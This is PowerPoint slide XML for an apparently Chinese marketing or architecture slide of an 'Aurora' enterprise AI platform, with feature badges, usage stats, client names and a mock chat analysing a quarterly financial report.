          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6797310" y="6189283"/>
            <a:ext cx="1222796" cy="197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007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v3.2.1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="975" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="332" name="Text 330"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7822301" y="6117354"/>
            <a:ext cx="1258761" cy="287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525" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A7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DOC-ARCH-2026-031 · Rev 3.2.1 · 2026-03-13 · 技术委员会审核通过</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="333" name="Shape 331"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6485991"/>
            <a:ext cx="9144000" cy="179823"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="040C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0" y="6485991"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="004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5" name="Text 333"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="143858" y="6512965"/>
            <a:ext cx="6293805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488" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A5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AURORA CLOUD PLATFORM · SYSTEM ARCHITECTURE · CONFIDENTIAL · FOR INTERNAL USE ONLY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="336" name="Text 334"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6293805" y="6512965"/>
            <a:ext cx="2697345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488" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2A5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05 / 06 · ARCHITECT: 赵建国 · BLUEPRINT STYLE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="48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604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9115" y="1540858"/>
            <a:ext cx="17982" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8070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97345" y="911478"/>
            <a:ext cx="17982" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8070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94690" y="1990416"/>
            <a:ext cx="17982" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8070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92920" y="1091301"/>
            <a:ext cx="17982" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8070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1593" y="2889531"/>
            <a:ext cx="17982" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8070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98230" y="3788646"/>
            <a:ext cx="17982" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8070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43363" y="4687761"/>
            <a:ext cx="17982" cy="17982"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8070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92186"/>
            <a:ext cx="9144000" cy="647363"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0806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830558"/>
            <a:ext cx="9144000" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A1A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98230" y="830558"/>
            <a:ext cx="5394690" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5028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7717" y="336044"/>
            <a:ext cx="359646" cy="359646"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 30510"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A28C8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7717" y="336044"/>
            <a:ext cx="359646" cy="359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9292" y="354027"/>
            <a:ext cx="719292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1222796" y="354027"/>
            <a:ext cx="251752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719292" y="533850"/>
            <a:ext cx="1978053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4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 Intelligence Platform</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2805239" y="407973"/>
            <a:ext cx="899115" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 115568"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C0A44"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="5A28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05239" y="407973"/>
            <a:ext cx="899115" cy="197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3" b="1" kern="0" spc="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PUBLIC BETA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3866195" y="425956"/>
            <a:ext cx="395611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3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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4046018" y="785602"/>
            <a:ext cx="35965" cy="35965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770" y="425956"/>
            <a:ext cx="395611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38" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A3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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729345" y="425956"/>
            <a:ext cx="395611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38" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A3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定价</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5160920" y="425956"/>
            <a:ext cx="395611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38" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A3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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5592496" y="425956"/>
            <a:ext cx="395611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38" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A3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企业版</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7354761" y="443938"/>
            <a:ext cx="719292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3A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2026-03-13</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8163965" y="389991"/>
            <a:ext cx="791221" cy="251752"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 36321"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A28C8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63965" y="389991"/>
            <a:ext cx="791221" cy="25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3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立即体验</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251752" y="1046345"/>
            <a:ext cx="215788" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect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3504" y="983407"/>
            <a:ext cx="3056991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63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AI Product · 2026</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251752" y="1199195"/>
            <a:ext cx="3416637" cy="341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下一代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251752" y="1522876"/>
            <a:ext cx="3416637" cy="341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智能协作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251752" y="1846558"/>
            <a:ext cx="3416637" cy="341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AI平台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251752" y="2242168"/>
            <a:ext cx="3326726" cy="46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638" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7A6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专为企业打造的全栈AI工作流平台——集多模态理解、代码生成、知识库问答于一体，本地部署+云端混合，一个平台解决全部AI需求。</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="638" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251752" y="2763655"/>
            <a:ext cx="1078938" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 56500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C0A44"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="3A18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1752" y="2763655"/>
            <a:ext cx="1078938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5" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C4B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🧠 多模态大模型</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Shape 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1402619" y="2763655"/>
            <a:ext cx="1078938" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 56500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="080C28"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="1A28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02619" y="2763655"/>
            <a:ext cx="1078938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5" b="1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本地部署</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Shape 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2553487" y="2763655"/>
            <a:ext cx="1078938" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 56500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="041814"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="0A38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53487" y="2763655"/>
            <a:ext cx="1078938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5" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6EE7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数据不出域</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Shape 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251752" y="2979442"/>
            <a:ext cx="1078938" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 56500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C0A28"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="3A10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1752" y="2979442"/>
            <a:ext cx="1078938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5" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9A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无代码配置</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Shape 43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1402619" y="2979442"/>
            <a:ext cx="1078938" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 56500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C0A44"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="3A18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402619" y="2979442"/>
            <a:ext cx="1078938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5" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C4B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🔗 RAG知识库</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="Shape 45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2553487" y="2979442"/>
            <a:ext cx="1078938" cy="161841"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 56500"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="080C28"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="1A28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53487" y="2979442"/>
            <a:ext cx="1078938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5" b="1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Agent工作流</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="49" name="Text 47"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251752" y="3195230"/>
            <a:ext cx="1168850" cy="197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120K+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51752" y="3375053"/>
            <a:ext cx="1168850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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A4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企业用户</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="51" name="Shape 49"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1402619" y="3231195"/>
            <a:ext cx="8991" cy="323681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A14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456566" y="3195230"/>
            <a:ext cx="1168850" cy="197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4.8/5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456566" y="3375053"/>
            <a:ext cx="1168850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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A4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平均评分</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54" name="Shape 52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2607434" y="3231195"/>
            <a:ext cx="8991" cy="323681"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A14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61381" y="3195230"/>
            <a:ext cx="1168850" cy="197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2661381" y="3375053"/>
            <a:ext cx="1168850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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5A4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正常运行</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="57" name="Shape 55"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251752" y="3572858"/>
            <a:ext cx="1258761" cy="305699"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 29912"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="5A28C8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51752" y="3572858"/>
            <a:ext cx="1258761" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8850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1752" y="3572858"/>
            <a:ext cx="1258761" cy="3056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免费开始  →</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="60" name="Shape 58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600425" y="3572858"/>
            <a:ext cx="1078938" cy="305699"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 29912"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E0C1A"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="2A204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600425" y="3572858"/>
            <a:ext cx="1078938" cy="3056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75" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="807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 观看演示</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="Text 60"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="251752" y="3968469"/>
            <a:ext cx="539469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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3A2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已被信任于</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="63" name="Text 61"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="845168" y="3968469"/>
            <a:ext cx="611398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b="1" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Text 62"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1510513" y="3968469"/>
            <a:ext cx="611398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b="1" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2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TENCENT</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="65" name="Text 63"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2175858" y="3968469"/>
            <a:ext cx="611398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b="1" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2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BYTEDANCE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="66" name="Text 64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2841204" y="3968469"/>
            <a:ext cx="611398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b="1" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2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HUAWEI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="Shape 65"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3776283" y="839549"/>
            <a:ext cx="5367717" cy="5214867"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0705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920142" y="1019372"/>
            <a:ext cx="4972106" cy="1852177"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1975"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E0C1A"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:srgbClr val="1E153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920142" y="1019372"/>
            <a:ext cx="4972106" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A1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920142" y="1019372"/>
            <a:ext cx="4972106" cy="233770"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A08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920142" y="1253142"/>
            <a:ext cx="4972106" cy="8991"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1410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992071" y="1100292"/>
            <a:ext cx="71929" cy="71929"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF5F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117947" y="1100292"/>
            <a:ext cx="71929" cy="71929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243823" y="1100292"/>
            <a:ext cx="71929" cy="71929"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="28CA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414655" y="1064327"/>
            <a:ext cx="2157876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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A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Chat · 智能对话助手</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Text 74"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7336779" y="1064327"/>
            <a:ext cx="1492531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488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模型: Aurora-Ultra-72B</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="488" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Shape 75"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8568566" y="1325071"/>
            <a:ext cx="197805" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E50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568566" y="1325071"/>
            <a:ext cx="197805" cy="197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75" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6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675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="Shape 77"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4819257" y="1325071"/>
            <a:ext cx="3713345" cy="215788"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 25425"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0A2840"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="14386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837239" y="1325071"/>
            <a:ext cx="3677381" cy="215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63" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="60A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帮我分析这份季度财报数据，找出关键趋势并生成可视化报告</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="Shape 79"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4028035" y="1325071"/>
            <a:ext cx="197805" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3A12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028035" y="1325071"/>
            <a:ext cx="197805" cy="197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75" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C4B5F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675" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="Shape 81"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4279788" y="1594805"/>
            <a:ext cx="4252814" cy="521487"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7014"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="140828"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2A105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351717" y="1630770"/>
            <a:ext cx="4108956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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C4B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已接收财报文件 Q1-2026.xlsx</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="Text 83"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4351717" y="1756646"/>
            <a:ext cx="4108956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7A6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正在分析 247 行数据 · 识别 12 个核心指标...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Text 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4351717" y="1882522"/>
            <a:ext cx="4108956" cy="1798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9A8A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营收同比增长 +18.4%，净利润率提升至22.8%，AI业务超额 +14%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="525" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="Text 85"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6437664" y="1882522"/>
            <a:ext cx="539469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63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+18.4%</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="563" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="Shape 86"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4279788" y="2170239"/>
            <a:ext cx="1618407" cy="197805"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 27736"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E0620"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="1E104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387681" y="2251159"/>
